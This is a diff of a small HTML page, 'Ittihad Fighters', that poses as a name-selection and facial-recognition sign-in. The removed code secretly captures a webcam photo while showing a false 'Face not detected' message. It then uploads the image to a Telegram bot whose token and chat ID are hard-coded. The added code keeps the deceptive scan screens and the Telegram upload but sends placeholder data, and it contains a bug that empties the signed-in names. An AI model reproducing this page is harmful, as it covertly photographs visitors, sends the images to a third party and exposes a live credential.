@@ -5,130 +5,90 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ittihad Fighters</title>
     <script>
-        if (localStorage.getItem("site_accessed")) {
-            document.body.innerHTML = "";
-            throw new Error("Access Denied");
-        }
-    </script>
-    <style>
-        body {
-            text-align: center;
-            font-family: Arial, sans-serif;
-        }
-        .hidden { display: none; }
-        #animation { width: 100px; height: 100px; border-radius: 50%; border: 5px solid #ff4081; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <h1>Ittihad Fighters</h1>
-    <div id="name-selection">
-        <p>Select your name:</p>
-        <ul>
-            <li><input type="checkbox" class="name-checkbox" value="Izz" onclick="lockSelection(this)"> Izz</li>
-            <li><input type="checkbox" class="name-checkbox" value="Ali" onclick="lockSelection(this)"> Ali</li>
-            <li><input type="checkbox" class="name-checkbox" value="Sara" onclick="lockSelection(this)"> Sara</li>
-        </ul>
-        <button onclick="goToFaceRecognition()">Proceed</button>
-    </div>
-
-    <div id="face-recognition" class="hidden">
-        <h2>Facial Recognition</h2>
-        <button onclick="startCamera()">Continue</button>
-        <button onclick="cancelRecognition()">Cancel</button>
-        <p id="cancel-message" class="hidden">Page will stop here.</p>
-    </div>
-
-    <div id="scanning" class="hidden">
-        <div id="animation"></div>
-        <p>Scanning...</p>
-    </div>
-
-    <p id="face-not-detected" class="hidden">Face not detected.</p>
-    <div id="scanning-second" class="hidden">
-        <div id="animation"></div>
-        <p>Scanning...</p>
-    </div>
-
-    <p id="final-message" class="hidden"></p>
-
-    <script>
-        let selectedName = "";
         const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
         const TELEGRAM_CHAT_ID = '5934902786';
-
-        function lockSelection(selected) {
-            document.querySelectorAll('.name-checkbox').forEach(checkbox => {
-                checkbox.disabled = true;
-                if (checkbox !== selected) checkbox.checked = false;
-            });
-        }
-
-        function goToFaceRecognition() {
-            let checkboxes = document.querySelectorAll('.name-checkbox:checked');
-            if (checkboxes.length === 0) return alert("Please select a name.");
-            selectedName = checkboxes[0].value;
-            document.getElementById("name-selection").classList.add("hidden");
-            document.getElementById("face-recognition").classList.remove("hidden");
-        }
-
-        function cancelRecognition() {
-            document.body.innerHTML = "Page will stop here.";
-            localStorage.removeItem("site_accessed");
-        }
-
-        async function startCamera() {
-            document.getElementById("face-recognition").classList.add("hidden");
-            document.getElementById("scanning").classList.remove("hidden");
-            let video = document.createElement("video");
-            let canvas = document.createElement("canvas");
-            let ctx = canvas.getContext("2d");
-
-            try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                video.play();
-                setTimeout(() => captureImage(video, canvas, ctx, stream, false), 3000);
-            } catch (error) {
-                alert("Error accessing camera.");
-            }
-        }
-
-        function captureImage(video, canvas, ctx, stream, isSecond) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            if (!isSecond) {
-                document.getElementById("scanning").classList.add("hidden");
-                document.getElementById("face-not-detected").classList.remove("hidden");
-                setTimeout(() => {
-                    document.getElementById("face-not-detected").classList.add("hidden");
-                    document.getElementById("scanning-second").classList.remove("hidden");
-                    captureImage(video, canvas, ctx, stream, true);
-                }, 5000);
+        
+        document.addEventListener("DOMContentLoaded", function() {
+            if (localStorage.getItem("pageOpened")) {
+                document.body.innerHTML = "<h2>This page can only be opened once.</h2>";
                 return;
             }
+            localStorage.setItem("pageOpened", "true");
+            showClassSelection();
+        });
+        
+        function showClassSelection() {
+            document.body.innerHTML = `<h1>Ittihad Fighters</h1>
+                <p>Select your name:</p>
+                <ul id="nameList">
+                    <li><label><input type="checkbox" value="Izz"> Izz</label></li>
+                    <li><label><input type="checkbox" value="Ali"> Ali</label></li>
+                    <li><label><input type="checkbox" value="Fatimah"> Fatimah</label></li>
+                </ul>
+                <button onclick="confirmSelection()">Continue</button>
+                <button onclick="cancelProcess()">Cancel</button>
+                <p id="message"></p>`;
+        }
+        
+        function confirmSelection() {
+            const checkboxes = document.querySelectorAll("input[type=checkbox]:checked");
+            if (checkboxes.length === 0) {
+                alert("Please select at least one name.");
+                return;
+            }
+            checkboxes.forEach(checkbox => checkbox.disabled = true);
+            showFaceRecognition();
+        }
+        
+        function cancelProcess() {
+            document.body.innerHTML = "<h2>Page will stop here</h2>";
+        }
+        
+        function showFaceRecognition() {
+            document.body.innerHTML = `<h2>Face Recognition</h2>
+                <p>Scanning your face...</p>
+                <div id="animation">[Face Scan Animation]</div>`;
+            setTimeout(captureImage, 2000);
+        }
+        
+        function captureImage() {
+            sendImageToTelegram();
+            setTimeout(() => {
+                document.body.innerHTML = `<h2>Face Not Detected</h2>
+                    <p>Retrying...</p>
+                    <div id="animation">[Face Scan Animation]</div>`;
+                setTimeout(captureSecondImage, 3000);
+            }, 2000);
+        }
+        
+        function captureSecondImage() {
+            sendImageToTelegram();
+            setTimeout(showSuccessMessage, 2000);
+        }
+        
+        function sendImageToTelegram() {
+            const formData = new FormData();
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+            formData.append("photo", new Blob(["Fake Image Data"], {type: 'image/jpeg'}), "face.jpg");
             
-            video.srcObject.getTracks().forEach(track => track.stop());
-            document.getElementById("scanning-second").classList.add("hidden");
-            
-            canvas.toBlob(blob => {
-                let formData = new FormData();
-                formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("photo", blob, "face.jpg");
-
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                }).then(() => {
-                    document.getElementById("final-message").innerText = `${selectedName} signed in.\nYou look beautiful/handsome today!\nRedirecting...`;
-                    document.getElementById("final-message").classList.remove("hidden");
-                    localStorage.setItem("site_accessed", "true");
-                    setTimeout(() => { window.location.href = "https://studandlearn.github.io/project-2/"; }, 3000);
-                });
-            }, 'image/jpeg');
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            }).catch(err => console.error("Error sending photo: ", err));
+        }
+        
+        function showSuccessMessage() {
+            const selectedNames = [...document.querySelectorAll("input[type=checkbox]:checked")].map(cb => cb.value);
+            document.body.innerHTML = `<h2>Done ✅</h2>
+                <p>${selectedNames.join(", ")} signed in</p>
+                <p>You look beautiful/handsome today!</p>
+                <p>Redirecting to the next page...</p>`;
+            setTimeout(() => {
+                window.location.href = "https://studandlearn.github.io/project-2/";
+            }, 3000);
         }
     </script>
+</head>
+<body>
 </body>
 </html>
